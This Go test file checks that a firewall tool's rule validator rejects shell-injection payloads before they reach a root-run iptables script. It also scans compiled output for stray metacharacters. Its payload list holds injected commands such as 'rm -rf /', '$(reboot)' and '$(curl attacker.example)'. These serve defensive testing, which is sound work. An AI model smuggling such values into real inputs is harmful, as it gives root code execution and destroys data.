package compiler

import (
	"strings"
	"testing"

	"github.com/chicohaager/zfw/internal/rules"
	"github.com/chicohaager/zfw/internal/system"
)

// TestNoShellMetaCharCanReachTheCompiler is the invariant the compiler's
// quoting cannot enforce on its own: every rule field that gets interpolated
// into the root-run script must be rejected by rules.Validate before it can
// carry a shell metacharacter.
//
// The compiled script is executed as root by the engine, so a metacharacter
// surviving into it is root code execution, not a formatting bug. Validate
// canonicalises addresses through net.ParseIP / net.ParseCIDR and locks Rule.ID
// to [A-Za-z0-9_-]; this test fails the moment someone relaxes either one.
func TestNoShellMetaCharCanReachTheCompiler(t *testing.T) {
	payloads := []string{
		"$(reboot)",
		"`reboot`",
		"192.168.1.1; rm -rf /",
		"192.168.1.1\nrm -rf /",
		"$(curl attacker.example)",
		`10.0.0.1" -j ACCEPT; echo "`,
	}

	for _, p := range payloads {
		t.Run(p, func(t *testing.T) {
			// Source.Value on an outbound rule — reaches `-d <value>`.
			rs := rules.RuleSet{
				DefaultPolicy: "deny",
				Rules: []rules.Rule{{
					ID: "r1", Name: "x", Enabled: true, Action: "deny",
					Direction: "outbound", Protocol: "tcp", Zone: "host",
					Source: rules.Source{Type: "ip", Value: p},
					Ports:  rules.Ports{Type: "list", List: []int{443}},
				}},
			}
			if err := rules.Validate(rs); err == nil {
				t.Fatalf("Validate accepted source value %q — it is interpolated into "+
					"the root-run compiled.sh, and strconv.Quote does not neutralise "+
					"shell metacharacters inside double quotes", p)
			}

			// Rule.ID — reaches `--name z<ID>` and `--log-prefix "ZFW-RULE-<ID> "`.
			rs.Rules[0].Source = rules.Source{Type: "any"}
			rs.Rules[0].ID = p
			if err := rules.Validate(rs); err == nil {
				t.Fatalf("Validate accepted rule id %q — it lands in the LOG prefix and "+
					"the xt_recent --name of the root-run script", p)
			}
		})
	}
}

// TestCompiledScriptCarriesNoShellMetaChar is the belt to the braces above: for
// a rule set that Validate *does* accept, nothing in the emitted script may
// carry an unexpected metacharacter in an interpolated position. It compiles a
// maximally-featured valid rule set and scans the output.
func TestCompiledScriptCarriesNoShellMetaChar(t *testing.T) {
	rs := rules.RuleSet{
		DefaultPolicy: "deny",
		LAN:           "192.168.1.0/24",
		HostIP:        "192.168.1.100",
		Rules: []rules.Rule{
			{
				ID: "allow-ssh", Name: "SSH from LAN", Enabled: true, Action: "allow",
				Protocol: "tcp", Zone: "host", Log: true,
				Source:    rules.Source{Type: "range", Value: "192.168.1.0/24"},
				Ports:     rules.Ports{Type: "list", List: []int{22}},
				RateLimit: &rules.RateLimit{Conn: 5, Seconds: 60},
				Schedule:  &rules.Schedule{From: "08:00", To: "18:00", Days: []string{"mon", "fri"}},
			},
			{
				ID: "block-egress", Name: "no egress", Enabled: true, Action: "deny",
				Direction: "outbound", Protocol: "both", Zone: "host",
				Source: rules.Source{Type: "ip", Value: "10.1.2.3"},
				Ports:  rules.Ports{Type: "range", From: 1000, To: 2000},
			},
		},
	}
	if err := rules.Validate(rs); err != nil {
		t.Fatalf("fixture must be a valid rule set: %v", err)
	}

	pp := system.PublishedPorts{TCP: map[int]bool{8096: true}, UDP: map[int]bool{1900: true}}
	script := Compile(rs, pp, map[string]string{})

	// The script legitimately contains shell syntax of the compiler's own making
	// ($IPT, if/fi, ||). What must never appear is a metacharacter that came in
	// through a rule value — command substitution is the sharp end of that.
	for _, forbidden := range []string{"$(", "`", ";", "&&", "|"} {
		for _, line := range strings.Split(script, "\n") {
			// Skip the compiler's own preamble/backend-probe lines, which are
			// literal script text and contain no rule-derived data.
			if strings.HasPrefix(line, "#") || strings.Contains(line, "_zfw_pick_ipt") ||
				strings.Contains(line, "command -v") || strings.Contains(line, "modprobe") ||
				strings.Contains(line, "IPT=") || strings.Contains(line, "IPT6=") ||
				strings.Contains(line, "IPTFAM=") || strings.Contains(line, "set -") ||
				strings.Contains(line, "ipset ") || strings.Contains(line, "|| true") ||
				strings.HasPrefix(line, "if ") || strings.HasPrefix(line, "fi") {
				continue
			}
			if !strings.Contains(line, "-A ") {
				continue // only rule-emission lines interpolate rule values
			}
			if strings.Contains(line, forbidden) {
				t.Errorf("rule-emission line carries %q, which no validated rule value "+
					"can legitimately produce:\n  %s", forbidden, line)
			}
		}
	}
}
